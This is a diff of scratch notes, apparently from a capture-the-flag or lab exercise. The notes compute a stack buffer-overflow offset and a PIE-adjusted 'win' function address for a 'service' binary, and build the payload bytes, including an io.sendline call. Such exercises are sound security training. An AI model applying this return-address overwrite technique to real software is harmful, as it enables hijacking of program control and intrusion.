@@ -10,7 +10,7 @@ x/10gx $rsp
 
 rbp addr - buf addr + 8 // win location
 
-current return addr - offset stastically + add win address stastically shown // get current win start address
+current return addr - return address offset stastically + add win address stastically shown // get current win start address
 
 objdump -d ./service | less
 
@@ -23,7 +23,7 @@ objdump -d ./service | less
 
 0x61 *(0x7ffff8061110 - 0x7ffff80610f0 + 8) + 0x564ae994451a  // '0x564ae9945442'
 
-===================
+=====================================
 
 address of buffer // 0x7fffffffdf40
 saved rip // 0x7fffffffdf68
@@ -32,3 +32,40 @@ rbp // 0x7fffffffdf60
 0x7fffffffdf68 - 
 
 0x5555555558e9 - 0x18e9 + 0x151a // '0x55555555551a'
+
+===== ====================================
+
+0x7fffffffdf30 - 0x7fffffffdf10 + 8 = 40 bytes
+
+wind addr =
+0x5555555557e9 - 0x17e9 + 0x151a = 93824992236826 = hex  0x55555555551a
+
+'a' * (0x7fffffffdf30 - 0x7fffffffdf10 + 8 ) + (0x5555555557e9 - 0x17e9 + 0x151a)
+
+'a' * (0x7fffffffdf30 - 0x7fffffffdf10 + 8 ) + (0x5555555557e9 - 0x17e9 + 0x151a)
+
+'a' * ( rbp address - buffer address + 8 ) + (rip address - return address offset statically shown + win address static)
+
+io.sendline(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1aUUUUU\x00\x00')  // 'a'*40 + struct.pack("<Q",win address hexa)
+
+>>> print(struct.pack("<Q",0x55555555551a))
+b'\x1aUUUUU\x00\x00'
+
+'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1aUUUUU\x00\x00'
+
+
+struct.pack("<Q",0x55cfc394cd37)
+b'7\xcd\x94\xc3\xcfU\x00\x00'
+
+
+>>> hex(0x557675cb07e9 - 0x17e4 + 0x151a)
+'0x557675cb051f'
+>>> struct.pack("<Q",0x557675cb051f)
+b'\x1f\x05\xcbuvU\x00\x00'
+
+
+hex(0x557675cb07e9 - 0x17e9 + 0x151a)
+
+===================
+server 
+0x55e5bee627e9 - 0x17e9 + 0x151a
